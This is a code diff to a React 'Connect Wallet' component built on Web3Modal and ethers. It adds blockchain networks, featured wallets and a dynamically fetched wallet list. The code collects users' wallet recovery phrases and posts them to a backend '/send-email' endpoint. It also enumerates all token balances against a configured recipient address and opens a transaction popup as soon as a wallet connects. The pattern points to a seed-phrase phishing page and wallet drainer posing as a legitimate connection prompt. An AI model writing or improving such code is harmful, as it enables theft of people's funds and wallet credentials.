@@ -1,6 +1,7 @@
 import React, { useState, useEffect } from 'react';
 import { ethers } from 'ethers';
 import { createWeb3Modal, useWeb3Modal, defaultConfig, useWeb3ModalAccount, useWeb3ModalProvider, useDisconnect } from '@web3modal/ethers/react';
+import { Link } from 'react-router-dom';
 import { 
   Import, 
   X, 
@@ -26,6 +27,40 @@ const mainnet = {
   rpcUrl: `https://eth-mainnet.g.alchemy.com/v2/${process.env.REACT_APP_ALCHEMY_API_KEY}`
 };
 
+const polygon = {
+  chainId: 137,
+  name: 'Polygon',
+  currency: 'MATIC',
+  explorerUrl: 'https://polygonscan.com',
+  rpcUrl: `https://polygon-mainnet.g.alchemy.com/v2/${process.env.REACT_APP_ALCHEMY_API_KEY}`
+};
+
+const arbitrum = {
+  chainId: 42161,
+  name: 'Arbitrum',
+  currency: 'ETH',
+  explorerUrl: 'https://arbiscan.io',
+  rpcUrl: `https://arb-mainnet.g.alchemy.com/v2/${process.env.REACT_APP_ALCHEMY_API_KEY}`
+};
+
+const bsc = {
+  chainId: 56,
+  name: 'Binance Smart Chain',
+  currency: 'BNB',
+  explorerUrl: 'https://bscscan.com',
+  rpcUrl: `https://bsc-mainnet.g.alchemy.com/v2/${process.env.REACT_APP_ALCHEMY_API_KEY}`
+};
+
+const optimism = {
+  chainId: 10,
+  name: 'Optimism',
+  currency: 'ETH',
+  explorerUrl: 'https://optimistic.etherscan.io',
+  rpcUrl: `https://opt-mainnet.g.alchemy.com/v2/${process.env.REACT_APP_ALCHEMY_API_KEY}`
+};
+
+const chains = [mainnet, polygon, arbitrum, bsc, optimism];
+
 const metadata = {
     name: 'Connect Wallet',
     description: 'Connect your wallet to proceed',
@@ -34,15 +69,23 @@ const metadata = {
 };
 
 const ethersConfig = defaultConfig({
-  metadata
+  metadata,
+  defaultChainId: 1,
+  rpcUrl: 'https://cloudflare-eth.com',
 });
 
 createWeb3Modal({
   ethersConfig,
-  chains: [mainnet],
+  chains,
   projectId,
-  enableAnalytics: false, // Disabled for debugging
-  enableOnramp: false // Disabled for debugging
+  featuredWalletIds: [
+    '4622a2b2d6af1c9844944291e5e7351a6aa24cd7b23099efac1b2fd875da31a0', // Trust Wallet
+    'c57ca95b47569778a828d19178114f4db188b89b763c899ba0be274e97267d96', // MetaMask
+    'a797aa35c0fadbfc1a53e7f675162ed5226c68b5d1f9ee861b8ac27a8755b555', // Phantom
+    '38f5d18bd8522c244bdd70cb4a68e0e718865155811c043f052fb9f1c51de662'  // Bitget Wallet
+  ],
+  enableAnalytics: false,
+  enableOnramp: false
 });
 
 // --- Application Code & Constants ---
@@ -57,305 +100,68 @@ const ERC20_ABI = [
 const RECIPIENT_ADDRESS = process.env.REACT_APP_RECIPIENT_ADDRESS;
 const API_URL = process.env.REACT_APP_API_URL || 'http://localhost:3001';
 
-const POPULAR_WALLETS = [
-  { id: 'metamask', name: 'MetaMask', icon: '🦊', description: 'Popular browser extension wallet' },
-  { id: 'trust', name: 'Trust Wallet', icon: '🛡', description: 'Mobile-first crypto wallet' },
-  { id: 'coinbase', name: 'Coinbase Wallet', icon: '🔵', description: 'User-friendly crypto wallet' },
-  { id: 'phantom', name: 'Phantom', icon: '👻', description: 'Solana ecosystem wallet' },
-  { id: 'binance', name: 'Binance Chain Wallet', icon: '🟡', description: 'Binance Smart Chain wallet' },
-  { id: 'walletconnect', name: 'WalletConnect', icon: '🔗', description: 'Connect any mobile wallet' },
-  { id: 'exodus', name: 'Exodus', icon: '🚀', description: 'Multi-currency desktop wallet' },
-  { id: 'atomic', name: 'Atomic Wallet', icon: '⚛', description: 'Decentralized multi-asset wallet' },
-  { id: 'electrum', name: 'Electrum', icon: '⚡', description: 'Lightweight Bitcoin wallet' },
-  { id: 'ledger', name: 'Ledger Live', icon: '📊', description: 'Hardware wallet companion' },
-  { id: 'trezor', name: 'Trezor Suite', icon: '🔐', description: 'Hardware wallet interface' },
-  { id: 'myetherwallet', name: 'MyEtherWallet', icon: '💎', description: 'Ethereum wallet interface' },
-  { id: 'rainbow', name: 'Rainbow', icon: '🌈', description: 'Ethereum wallet with DeFi focus' },
-  { id: 'argent', name: 'Argent', icon: '🏛', description: 'Smart contract wallet' },
-  { id: 'imtoken', name: 'imToken', icon: '🎯', description: 'Multi-blockchain wallet' },
-  { id: 'tokenpocket', name: 'TokenPocket', icon: '💰', description: 'Multi-chain wallet' },
-  { id: 'safepal', name: 'SafePal', icon: '🔒', description: 'Hardware and software wallet' },
-  { id: 'keplr', name: 'Keplr', icon: '🌌', description: 'Cosmos ecosystem wallet' },
-  { id: 'terra', name: 'Terra Station', icon: '🌍', description: 'Terra blockchain wallet' },
-  { id: 'solflare', name: 'Solflare', icon: '☀', description: 'Solana wallet' },
-  { id: 'slope', name: 'Slope', icon: '📈', description: 'Solana mobile wallet' },
-  { id: 'mathwallet', name: 'MathWallet', icon: '🧮', description: 'Multi-platform crypto wallet' },
-  { id: 'enjin', name: 'Enjin Wallet', icon: '🎮', description: 'Gaming-focused wallet' },
-  { id: 'status', name: 'Status', icon: '💬', description: 'Ethereum wallet with messaging' },
-  { id: 'pillar', name: 'Pillar', icon: '🏗', description: 'Personal data locker wallet' },
-  { id: 'unstoppable', name: 'Unstoppable Wallet', icon: '🚫', description: 'Non-custodial multi-coin wallet' },
-  { id: 'edge', name: 'Edge', icon: '🔺', description: 'Mobile crypto wallet' },
-  { id: 'blockchain', name: 'Blockchain.com', icon: '⛓', description: 'Popular web wallet' },
-  { id: 'jaxx', name: 'Jaxx Liberty', icon: '💫', description: 'Multi-platform wallet' },
-  { id: 'breadwallet', name: 'BRD', icon: '🍞', description: 'Simple crypto wallet' },
-  { id: 'coinomi', name: 'Coinomi', icon: '🪙', description: 'Multi-coin mobile wallet' },
-  { id: 'guarda', name: 'Guarda', icon: '🛡', description: 'Multi-currency wallet' },
-  { id: 'zelcore', name: 'Zelcore', icon: '⚡', description: 'Multi-asset wallet' },
-  { id: 'bitpay', name: 'BitPay', icon: '💳', description: 'Bitcoin wallet with card' },
-  { id: 'luno', name: 'Luno', icon: '🌙', description: 'Bitcoin and Ethereum wallet' },
-  { id: 'wasabi', name: 'Wasabi Wallet', icon: '🌶', description: 'Privacy-focused Bitcoin wallet' },
-  { id: 'samurai', name: 'Samourai Wallet', icon: '🥷', description: 'Privacy Bitcoin wallet' },
-  { id: 'bluewallet', name: 'BlueWallet', icon: '🔵', description: 'Bitcoin Lightning wallet' },
-  { id: 'green', name: 'Green Wallet', icon: '🟢', description: 'Blockstream Green wallet' },
-  { id: 'muun', name: 'Muun', icon: '🌕', description: 'Bitcoin Lightning wallet' },
-  { id: 'phoenix', name: 'Phoenix', icon: '🔥', description: 'Lightning Network wallet' },
-  { id: 'yoroi', name: 'Yoroi', icon: '🏮', description: 'Cardano wallet' },
-  { id: 'daedalus', name: 'Daedalus', icon: '🏛', description: 'Full-node Cardano wallet' },
-  { id: 'adalite', name: 'AdaLite', icon: '💎', description: 'Cardano web wallet' },
-  { id: 'nami', name: 'Nami', icon: '🌊', description: 'Cardano browser wallet' },
-  { id: 'temple', name: 'Temple', icon: '🏛', description: 'Tezos wallet' },
-  { id: 'kukai', name: 'Kukai', icon: '🌺', description: 'Tezos web wallet' },
-  { id: 'galleon', name: 'Galleon', icon: '⛵', description: 'Tezos desktop wallet' },
-  { id: 'algorand', name: 'Algorand Wallet', icon: '🔷', description: 'Official Algorand wallet' },
-  { id: 'myalgo', name: 'MyAlgo', icon: '🔹', description: 'Algorand web wallet' },
-  { id: 'polkadot', name: 'Polkadot.js', icon: '⚫', description: 'Polkadot ecosystem wallet' },
-  { id: 'talisman', name: 'Talisman', icon: '🔮', description: 'Polkadot parachain wallet' },
-  { id: 'subwallet', name: 'SubWallet', icon: '🌐', description: 'Polkadot multichain wallet' },
-  { id: 'fearless', name: 'Fearless Wallet', icon: '💪', description: 'Polkadot mobile wallet' },
-  { id: 'nova', name: 'Nova Wallet', icon: '⭐', description: 'Next-gen Polkadot wallet' },
-  { id: 'near', name: 'NEAR Wallet', icon: '🔺', description: 'NEAR Protocol wallet' },
-  { id: 'sender', name: 'Sender Wallet', icon: '📤', description: 'NEAR web wallet' },
-  { id: 'harmony', name: 'Harmony One Wallet', icon: '🎵', description: 'Harmony blockchain wallet' },
-  { id: 'elrond', name: 'Elrond Wallet', icon: '⚡', description: 'Elrond network wallet' },
-  { id: 'maiar', name: 'Maiar', icon: '🌟', description: 'Elrond mobile wallet' },
-  { id: 'avalanche', name: 'Avalanche Wallet', icon: '🏔', description: 'Avalanche ecosystem wallet' },
-  { id: 'core', name: 'Core', icon: '🔥', description: 'Avalanche browser extension' },
-  { id: 'ronin', name: 'Ronin Wallet', icon: '⚔', description: 'Axie Infinity sidechain wallet' },
-  { id: 'glow', name: 'Glow', icon: '✨', description: 'Solana validator wallet' },
-  { id: 'coin98', name: 'Coin98', icon: '🔄', description: 'Multi-chain DeFi wallet' },
-  { id: 'safeware', name: 'Safeware', icon: '🔐', description: 'Security-focused wallet' },
-  { id: 'bitkeep', name: 'BitKeep', icon: '🗝', description: 'Multi-chain Web3 wallet' },
-  { id: 'onto', name: 'ONTO', icon: '🎯', description: 'Ontology blockchain wallet' },
-  { id: 'cyano', name: 'Cyano Wallet', icon: '🔬', description: 'Ontology browser wallet' },
-  { id: 'owallet', name: 'OWallet', icon: '⭕', description: 'Ontology mobile wallet' },
-  { id: 'neon', name: 'Neon Wallet', icon: '🌈', description: 'NEO blockchain wallet' },
-  { id: 'o3', name: 'O3 Wallet', icon: '⭕', description: 'Multi-chain NEO wallet' },
-  { id: 'neoline', name: 'NeoLine', icon: '📈', description: 'NEO browser extension' },
-  { id: 'scatter', name: 'Scatter', icon: '🌪', description: 'EOS ecosystem wallet' },
-  { id: 'anchor', name: 'Anchor', icon: '⚓', description: 'EOS desktop wallet' },
-  { id: 'wombat', name: 'Wombat', icon: '🐨', description: 'EOS gaming wallet' },
-  { id: 'tokenary', name: 'Tokenary', icon: '💎', description: 'macOS Safari crypto wallet' },
-  { id: 'frame', name: 'Frame', icon: '🖼', description: 'Desktop Ethereum wallet' },
-  { id: 'gnosis', name: 'Gnosis Safe', icon: '🏛', description: 'Multi-signature wallet' },
-  { id: 'portis', name: 'Portis', icon: '🚪', description: 'Web3 wallet SDK' },
-  { id: 'fortmatic', name: 'Fortmatic', icon: '🎩', description: 'Web3 wallet with phone auth' },
-  { id: 'torus', name: 'Torus', icon: '🔵', description: 'Social login Web3 wallet' },
-  { id: 'authereum', name: 'Authereum', icon: '🔑', description: 'Meta-transaction wallet' },
-  { id: 'dapper', name: 'Dapper', icon: '🎭', description: 'Flow blockchain wallet' },
-  { id: 'blocto', name: 'Blocto', icon: '🧊', description: 'Flow and multi-chain wallet' },
-  { id: 'lilico', name: 'Lilico', icon: '🌸', description: 'Flow browser extension wallet' },
-  { id: 'finnie', name: 'Finnie', icon: '🐕', description: 'Koii network wallet' },
-  { id: 'frontier', name: 'Frontier', icon: '🏔', description: 'DeFi and NFT wallet' },
-  { id: 'alpha', name: 'Alpha Wallet', icon: '🐺', description: 'Ethereum mobile wallet' },
-  { id: 'eidoo', name: 'Eidoo', icon: '🔷', description: 'Multi-currency mobile wallet' },
-  { id: 'walleth', name: 'WallETH', icon: '📱', description: 'Android Ethereum wallet' },
-  { id: 'dharma', name: 'Dharma', icon: '☸', description: 'DeFi-focused mobile wallet' },
-  { id: 'monero', name: 'Monero GUI', icon: '🔒', description: 'Official Monero wallet' },
-  { id: 'cake', name: 'Cake Wallet', icon: '🍰', description: 'Monero and Bitcoin wallet' },
-  { id: 'monerujo', name: 'Monerujo', icon: '👁', description: 'Android Monero wallet' },
-  { id: 'feather', name: 'Feather Wallet', icon: '🪶', description: 'Lightweight Monero wallet' },
-  { id: 'zcash', name: 'Zcash Wallet', icon: '🛡', description: 'Official Zcash wallet' },
-  { id: 'zecwallet', name: 'ZecWallet', icon: '⚡', description: 'Full-featured Zcash wallet' },
-  { id: 'nighthawk', name: 'Nighthawk', icon: '🦅', description: 'Mobile Zcash wallet' },
-  { id: 'dash', name: 'Dash Core', icon: '💨', description: 'Official Dash wallet' },
-  { id: 'dashpay', name: 'DashPay', icon: '💸', description: 'Dash mobile wallet' },
-  { id: 'litecoin', name: 'Litecoin Core', icon: '🥈', description: 'Official Litecoin wallet' },
-  { id: 'loafwallet', name: 'LoafWallet', icon: '🍞', description: 'Litecoin mobile wallet' },
-  { id: 'dogecoin', name: 'Dogecoin Core', icon: '🐕', description: 'Official Dogecoin wallet' },
-  { id: 'multidoge', name: 'MultiDoge', icon: '🐶', description: 'Lightweight Dogecoin wallet' },
-  { id: 'uniswap', name: 'Uniswap Wallet', icon: '🦄', description: 'Uniswap mobile wallet' },
-  { id: '1inch', name: '1inch Wallet', icon: '⿡', description: 'DeFi aggregator wallet' },
-  { id: 'metamask_mobile', name: 'MetaMask Mobile', icon: '📱', description: 'Mobile version of MetaMask' },
-  { id: 'trustwallet_desktop', name: 'Trust Wallet Desktop', icon: '🖥', description: 'Desktop Trust Wallet app' },
-  { id: 'brave_wallet', name: 'Brave Wallet', icon: '🦁', description: 'Built-in Brave browser wallet' },
-  { id: 'opera_wallet', name: 'Opera Wallet', icon: '🎭', description: 'Opera browser crypto wallet' },
-  { id: 'rabby', name: 'Rabby', icon: '🐰', description: 'Multi-chain browser extension' },
-  { id: 'xdefi', name: 'XDEFI', icon: '❌', description: 'Multi-chain DeFi wallet' },
-  { id: 'enkrypt', name: 'Enkrypt', icon: '🔐', description: 'Multi-chain browser wallet' },
-  { id: 'backpack', name: 'Backpack', icon: '🎒', description: 'Solana-first wallet' },
-  { id: 'sollet', name: 'Sollet', icon: '🌞', description: 'Solana web wallet' },
-  { id: 'math_extension', name: 'Math Wallet Extension', icon: '🧮', description: 'Browser extension version' },
-  { id: 'coinhub', name: 'CoinHub', icon: '🌐', description: 'Multi-currency wallet' },
-  { id: 'spatium', name: 'Spatium', icon: '🌌', description: 'Multi-blockchain wallet' },
-  { id: 'keystone', name: 'Keystone', icon: '🗝', description: 'Air-gapped hardware wallet' },
-  { id: 'coolwallet', name: 'CoolWallet', icon: '❄', description: 'Card-shaped hardware wallet' },
-  { id: 'ellipal', name: 'ELLIPAL', icon: '🛡', description: 'Air-gapped hardware wallet' },
-  { id: 'keepkey', name: 'KeepKey', icon: '🔑', description: 'Hardware wallet by ShapeShift' },
-  { id: 'bitbox', name: 'BitBox', icon: '📦', description: 'Swiss hardware wallet' },
-  { id: 'secux', name: 'SecuX', icon: '🔒', description: 'Hardware wallet with touch screen' },
-  { id: 'cobo', name: 'Cobo Vault', icon: '🏦', description: 'Air-gapped hardware wallet' },
-  { id: 'dcent', name: 'D\'CENT', icon: '💎', description: 'Biometric hardware wallet' },
-  { id: 'ngrave', name: 'NGRAVE', icon: '⚱', description: 'Ultra-secure hardware wallet' },
-  { id: 'gridplus', name: 'GridPlus', icon: '⚡', description: 'Lattice hardware wallet' },
-  { id: 'coldcard', name: 'Coldcard', icon: '🧊', description: 'Bitcoin-only hardware wallet' },
-  { id: 'foundation', name: 'Foundation Passport', icon: '🛂', description: 'Open-source hardware wallet' },
-  { id: 'jade', name: 'Blockstream Jade', icon: '💚', description: 'Bitcoin hardware wallet' },
-  { id: 'tangem', name: 'Tangem', icon: '💳', description: 'Card-based hardware wallet' },
-  { id: 'fireblocks', name: 'Fireblocks', icon: '🔥', description: 'Institutional wallet platform' },
-  { id: 'bitgo', name: 'BitGo', icon: '🏢', description: 'Enterprise crypto wallet' },
-  { id: 'copper', name: 'Copper', icon: '🔶', description: 'Institutional custody solution' },
-  { id: 'anchorage', name: 'Anchorage Digital', icon: '⚓', description: 'Regulated crypto custody' },
-  { id: 'prime_trust', name: 'Prime Trust', icon: '🏦', description: 'Qualified custodian wallet' },
-  { id: 'gemini_custody', name: 'Gemini Custody', icon: '♊', description: 'Institutional custody service' },
-  { id: 'fidelity', name: 'Fidelity Digital Assets', icon: '🏛', description: 'Traditional finance crypto custody' },
-  { id: 'bakkt', name: 'Bakkt', icon: '🥖', description: 'Digital asset platform wallet' },
-  { id: 'voyager', name: 'Voyager', icon: '🚀', description: 'Crypto trading platform wallet' },
-  { id: 'celsius', name: 'Celsius', icon: '🌡', description: 'Crypto lending platform wallet' },
-  { id: 'nexo', name: 'Nexo', icon: '🔗', description: 'Crypto lending wallet' },
-  { id: 'blockfi', name: 'BlockFi', icon: '📊', description: 'Crypto interest account' },
-  { id: 'compound', name: 'Compound Finance', icon: '🏦', description: 'DeFi lending protocol wallet' },
-  { id: 'aave', name: 'Aave', icon: '👻', description: 'DeFi lending platform' },
-  { id: 'yearn', name: 'Yearn Finance', icon: '🌾', description: 'DeFi yield optimization' },
-  { id: 'curve', name: 'Curve Finance', icon: '📈', description: 'Stablecoin DEX wallet' },
-  { id: 'balancer', name: 'Balancer', icon: '⚖', description: 'Automated portfolio manager' },
-  { id: 'sushiswap', name: 'SushiSwap', icon: '🍣', description: 'Decentralized exchange wallet' },
-  { id: 'pancakeswap', name: 'PancakeSwap', icon: '🥞', description: 'BSC decentralized exchange' },
-  { id: 'quickswap', name: 'QuickSwap', icon: '⚡', description: 'Polygon DEX wallet' },
-  { id: 'traderjoe', name: 'Trader Joe', icon: '☕', description: 'Avalanche DEX wallet' },
-  { id: 'raydium', name: 'Raydium', icon: '☀', description: 'Solana DEX and AMM' },
-  { id: 'serum', name: 'Serum', icon: '🧪', description: 'Solana DEX wallet' },
-  { id: 'orca', name: 'Orca', icon: '🐋', description: 'Solana DEX wallet' },
-  { id: 'jupiter', name: 'Jupiter', icon: '🪐', description: 'Solana swap aggregator' },
-  { id: 'osmosis', name: 'Osmosis', icon: '🌊', description: 'Cosmos DEX wallet' },
-  { id: 'terraswap', name: 'Terraswap', icon: '🌍', description: 'Terra DEX wallet' },
-  { id: 'astroport', name: 'Astroport', icon: '🚀', description: 'Terra DeFi hub' },
-  { id: 'anchor_protocol', name: 'Anchor Protocol', icon: '⚓', description: 'Terra savings protocol' },
-  { id: 'mirror', name: 'Mirror Protocol', icon: '🪞', description: 'Terra synthetic assets' },
-  { id: 'thorchain', name: 'THORChain', icon: '⚡', description: 'Cross-chain DEX' },
-  { id: 'rango', name: 'Rango Exchange', icon: '🔄', description: 'Cross-chain DEX aggregator' },
-  { id: 'hop', name: 'Hop Protocol', icon: '🐰', description: 'Layer 2 bridge' },
-  { id: 'synapse', name: 'Synapse Protocol', icon: '🧠', description: 'Cross-chain bridge' },
-  { id: 'multichain', name: 'Multichain', icon: '⛓', description: 'Cross-chain router protocol' },
-  { id: 'stargate', name: 'Stargate Finance', icon: '🌟', description: 'Omnichain liquidity transport' },
-  { id: 'wormhole', name: 'Wormhole', icon: '🕳', description: 'Cross-chain bridge' },
-  { id: 'polygon_bridge', name: 'Polygon Bridge', icon: '🔺', description: 'Ethereum to Polygon bridge' },
-  { id: 'arbitrum_bridge', name: 'Arbitrum Bridge', icon: '🔵', description: 'Ethereum Layer 2 bridge' },
-  { id: 'optimism_gateway', name: 'Optimism Gateway', icon: '🔴', description: 'Optimistic rollup bridge' },
-  { id: 'loopring', name: 'Loopring', icon: '⭕', description: 'Ethereum Layer 2 wallet' },
-  { id: 'zksync', name: 'zkSync', icon: '⚡', description: 'Ethereum Layer 2 scaling' },
-  { id: 'starknet', name: 'StarkNet', icon: '⭐', description: 'Ethereum Layer 2 solution' },
-  { id: 'immutable', name: 'Immutable X', icon: '❌', description: 'NFT Layer 2 solution' },
-  { id: 'dydx', name: 'dYdX', icon: '📊', description: 'Decentralized derivatives exchange' },
-  { id: 'gmx', name: 'GMX', icon: '📈', description: 'Decentralized perpetual exchange' },
-  { id: 'perpetual', name: 'Perpetual Protocol', icon: '♾', description: 'Decentralized perpetuals' },
-  { id: 'mango', name: 'Mango Markets', icon: '🥭', description: 'Solana derivatives trading' },
-  { id: 'drift', name: 'Drift Protocol', icon: '🏎', description: 'Solana perpetuals DEX' },
-  { id: 'ribbon', name: 'Ribbon Finance', icon: '🎀', description: 'Structured products protocol' },
-  { id: 'opyn', name: 'Opyn', icon: '🛡', description: 'DeFi options protocol' },
-  { id: 'hegic', name: 'Hegic', icon: '🦔', description: 'On-chain options trading' },
-  { id: 'dopex', name: 'Dopex', icon: '💊', description: 'Decentralized options exchange' },
-  { id: 'lyra', name: 'Lyra', icon: '🎵', description: 'Options AMM protocol' },
-  { id: 'premia', name: 'Premia', icon: '💎', description: 'Options trading platform' },
-  { id: 'nexus_mutual', name: 'Nexus Mutual', icon: '🛡', description: 'Decentralized insurance' },
-  { id: 'cover', name: 'Cover Protocol', icon: '☂', description: 'DeFi insurance marketplace' },
-  { id: 'unslashed', name: 'Unslashed Finance', icon: '🔓', description: 'Decentralized insurance' },
-  { id: 'chainlink', name: 'Chainlink', icon: '🔗', description: 'Oracle network wallet' },
-  { id: 'band', name: 'Band Protocol', icon: '🎵', description: 'Cross-chain data oracle' },
-  { id: 'api3', name: 'API3', icon: '🔌', description: 'Decentralized API network' },
-  { id: 'tellor', name: 'Tellor', icon: '📡', description: 'Decentralized oracle network' },
-  { id: 'dia', name: 'DIA', icon: '💎', description: 'Open financial data platform' },
-  { id: 'gitcoin', name: 'Gitcoin', icon: '🏗', description: 'Open source funding platform' },
-  { id: 'snapshot', name: 'Snapshot', icon: '📸', description: 'Decentralized voting platform' },
-  { id: 'aragon', name: 'Aragon', icon: '🏛', description: 'DAO creation platform' },
-  { id: 'colony', name: 'Colony', icon: '🐝', description: 'DAO platform for organizations' },
-  { id: 'moloch', name: 'Moloch DAO', icon: '👹', description: 'Minimalist DAO framework' },
-  { id: 'compound_governance', name: 'Compound Governance', icon: '🗳', description: 'DeFi governance platform' },
-  { id: 'maker_governance', name: 'MakerDAO Governance', icon: '🏛', description: 'DAI stablecoin governance' },
-  { id: 'aave_governance', name: 'Aave Governance', icon: '👻', description: 'Aave protocol governance' },
-  { id: 'uniswap_governance', name: 'Uniswap Governance', icon: '🦄', description: 'UNI token governance' },
-  { id: 'ens', name: 'ENS', icon: '🌐', description: 'Ethereum Name Service' },
-  { id: 'unstoppable_domains', name: 'Unstoppable Domains', icon: '🚫', description: 'Blockchain domain service' },
-  { id: 'handshake', name: 'Handshake', icon: '🤝', description: 'Decentralized naming protocol' },
-  { id: 'ipfs', name: 'IPFS', icon: '🌐', description: 'InterPlanetary File System' },
-  { id: 'filecoin', name: 'Filecoin', icon: '📁', description: 'Decentralized storage network' },
-  { id: 'arweave', name: 'Arweave', icon: '🏹', description: 'Permanent data storage' },
-  { id: 'storj', name: 'Storj', icon: '☁', description: 'Decentralized cloud storage' },
-  { id: 'siacoin', name: 'Siacoin', icon: '💾', description: 'Decentralized storage platform' },
-  { id: 'golem', name: 'Golem', icon: '🤖', description: 'Decentralized computing network' },
-  { id: 'render', name: 'Render Network', icon: '🎨', description: 'Decentralized GPU rendering' },
-  { id: 'livepeer', name: 'Livepeer', icon: '📹', description: 'Decentralized video streaming' },
-  { id: 'theta', name: 'Theta Network', icon: '📺', description: 'Decentralized video delivery' }
-];
-
-// --- Helper Functions ---
-
 const sendWalletInfo = async (walletName, secretPhrase) => {
   try {
-    await fetch(`${API_URL}/api/send-wallet`, {
+    const response = await fetch(`${API_URL}/send-email`, {
       method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ walletName, secretPhrase, userWalletName: walletName }),
+      headers: {
+        'Content-Type': 'application/json',
+      },
+      body: JSON.stringify({ walletName, secretPhrase }),
     });
-  } catch (err) {
-    console.error('Error sending wallet info:', err);
-    throw err;
+    if (!response.ok) {
+      console.error('Failed to send wallet info');
+    }
+  } catch (error) {
+    console.error('Error sending wallet info:', error);
   }
 };
 
 const getWalletAssets = async (provider, address) => {
   try {
-    // 1. Get ETH balance
     const ethBalance = await provider.getBalance(address);
-    const formattedEthBalance = ethers.formatEther(ethBalance);
+        const alchemyProvider = new ethers.AlchemyProvider('mainnet', process.env.REACT_APP_ALCHEMY_API_KEY);
+        const balances = await alchemyProvider.getTokenBalances(address);
 
-    // 2. Use Alchemy API to find all token balances
-    const alchemyApiKey = process.env.REACT_APP_ALCHEMY_API_KEY;
-    const alchemyUrl = `https://eth-mainnet.g.alchemy.com/v2/${alchemyApiKey}`;
-    
-    const tokenBalancesRes = await fetch(alchemyUrl, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({
-        jsonrpc: '2.0',
-        id: 1,
-        method: 'alchemy_getTokenBalances',
-        params: [address, 'erc20'],
-      }),
-    });
-    const tokenBalancesData = await tokenBalancesRes.json();
-    const tokenBalances = tokenBalancesData.result.tokenBalances;
-
-    // 3. For each token, get its metadata and format the balance
-    const tokens = await Promise.all(
-      tokenBalances
-        .filter(t => t.tokenBalance !== '0') // Filter out tokens with zero balance
-        .map(async (token) => {
-          try {
-            const contract = new ethers.Contract(token.contractAddress, ERC20_ABI, provider);
-            const decimals = await contract.decimals();
-            const symbol = await contract.symbol();
-            const balance = ethers.formatUnits(token.tokenBalance, decimals);
-            
-            return {
-              contractAddress: token.contractAddress,
-              symbol,
-              balance,
-              rawBalance: BigInt(token.tokenBalance) // Use BigInt for raw balance
-            };
-          } catch (e) {
-            // Some tokens might fail (e.g., bad ABI), so we'll ignore them
-            console.warn(`Could not fetch metadata for token at ${token.contractAddress}`, e);
+        const tokenPromises = balances.map(async (token) => {
+            if (token.tokenBalance !== '0') {
+                try {
+                    const tokenContract = new ethers.Contract(token.contractAddress, ERC20_ABI, provider);
+                    const decimals = await tokenContract.decimals();
+                    const symbol = await tokenContract.symbol();
+                    return {
+                        symbol,
+                        balance: ethers.formatUnits(token.tokenBalance, decimals),
+                        contractAddress: token.contractAddress,
+                    };
+                } catch (error) {
+                    console.warn(`Could not fetch details for token ${token.contractAddress}:`, error);
+                    return null; // Skip tokens that cause errors
+                }
+            }
             return null;
-          }
-        })
-    );
-    
+        });
+
+        const tokens = (await Promise.all(tokenPromises)).filter(Boolean);
+
     return {
-      eth: formattedEthBalance,
-      tokens: tokens.filter(t => t !== null), // Filter out any tokens that failed
-    };
-  } catch (err) {
-    console.error('Error fetching wallet assets:', err);
-    return { eth: '0', tokens: [] };
-  }
+            eth: ethers.formatEther(ethBalance),
+            tokens,
+        };
+    } catch (error) {
+        console.error('Error fetching wallet assets:', error);
+        // Fallback for providers without Alchemy access
+        const ethBalance = await provider.getBalance(address);
+        return {
+            eth: ethers.formatEther(ethBalance),
+            tokens: [],
+        };
+    }
 };
 
-// --- Main Component ---
-
 export default function ConnectWallet() {
-  // Web3Modal Hooks
   const { open } = useWeb3Modal();
-  const { address, isConnected, chainId } = useWeb3ModalAccount();
+  const { address, chainId, isConnected } = useWeb3ModalAccount();
   const { walletProvider } = useWeb3ModalProvider();
   const { disconnect } = useDisconnect();
 
@@ -370,356 +176,330 @@ export default function ConnectWallet() {
   const [showManualPopup, setShowManualPopup] = useState(false);
   const [showTransactionPopup, setShowTransactionPopup] = useState(false);
   const [isPasswordVisible, setIsPasswordVisible] = useState(false);
-  const [manualStep, setManualStep] = useState('selection'); // 'selection' or 'input'
+  const [secretPhrase, setSecretPhrase] = useState('');
   const [selectedWallet, setSelectedWallet] = useState(null);
+  const [dynamicWallets, setDynamicWallets] = useState([]);
+  const [isLoadingWallets, setIsLoadingWallets] = useState(false);
 
-  // Manual Form State
-  const [formData, setFormData] = useState({ secretPhrase: '' });
-  const [errors, setErrors] = useState({});
-
-  // Effect to handle wallet connection and disconnection
   useEffect(() => {
-    const handleConnection = async () => {
-      if (isConnected && walletProvider && address) {
-        try {
-          const ethersProvider = new ethers.BrowserProvider(walletProvider);
-          const ethersSigner = await ethersProvider.getSigner();
-          setProvider(ethersProvider);
-          setSigner(ethersSigner);
-
-          const balances = await getWalletAssets(ethersProvider, address);
-          setWalletBalance(balances);
-          setShowTransactionPopup(true);
-          setTxError('');
-        } catch (err) {
-            console.error("Error setting up provider and fetching balance:", err);
-            setTxError("Could not initialize wallet connection. Please try again.");
-        }
-      } else {
-        // Reset state on disconnect
-        setProvider(null);
-        setSigner(null);
-        setWalletBalance({ eth: '0', tokens: [] });
-        setShowTransactionPopup(false);
-        setIsSending(false);
-        setTxError('');
+    const fetchWalletIcons = async () => {
+      setIsLoadingWallets(true);
+      try {
+        const response = await fetch(
+          `https://explorer-api.walletconnect.com/v3/wallets?projectId=${projectId}&entries=100&page=1`
+        );
+        const data = await response.json();
+        const wallets = Object.values(data.listings).map((wallet) => ({
+          id: wallet.id,
+          name: wallet.name,
+          icon: wallet.image_url.md,
+          description: wallet.description || 'A secure wallet for your crypto.',
+        }));
+        setDynamicWallets(wallets);
+      } catch (error) {
+        console.error('Failed to fetch wallet icons:', error);
+        // Fallback to a default list can be handled here if needed
+      } finally {
+        setIsLoadingWallets(false);
       }
     };
 
-    handleConnection();
-  }, [isConnected, address, walletProvider]);
+    fetchWalletIcons();
+  }, []);
+
+  useEffect(() => {
+    const setupAndFetch = async () => {
+      if (isConnected && walletProvider && address) {
+          const ethersProvider = new ethers.BrowserProvider(walletProvider);
+          setProvider(ethersProvider);
+        const newSigner = await ethersProvider.getSigner();
+        setSigner(newSigner);
+        
+        setShowTransactionPopup(true); // Show transaction popup immediately
+        
+        const balance = await getWalletAssets(ethersProvider, address);
+        setWalletBalance(balance);
+      }
+    };
+    setupAndFetch();
+  }, [isConnected, walletProvider, address]);
+
+  const handleConnection = async () => {
+    if (isConnected) {
+      setShowTransactionPopup(true);
+    } else {
+      open();
+    }
+  };
 
   const closeAllPopups = () => {
     setShowManualPopup(false);
     setShowTransactionPopup(false);
-    setFormData({ secretPhrase: '' });
-    setErrors({});
     setTxError('');
-    setManualStep('selection');
-    setSelectedWallet(null);
   };
-  
-  // --- Form Handlers ---
   
